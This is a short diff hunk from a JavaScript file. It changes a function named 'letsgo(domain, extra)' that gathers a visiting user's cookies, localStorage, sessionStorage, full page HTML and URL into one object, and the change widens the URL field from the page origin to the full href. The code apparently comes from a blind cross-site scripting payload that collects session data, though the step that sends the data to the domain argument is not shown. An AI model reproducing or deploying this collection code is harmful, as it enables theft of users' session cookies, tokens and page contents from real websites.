@@ -20,7 +20,7 @@ function letsgo(domain, extra){
 	var data = {
 		extra: extra,
 		cookies: document.cookie,
-		url: location.origin,
+		url: location.href,
 		localStorage: document.localStorage,
 		sessionStorage: document.sessionStorage,
 		html: document.documentElement.outerHTML
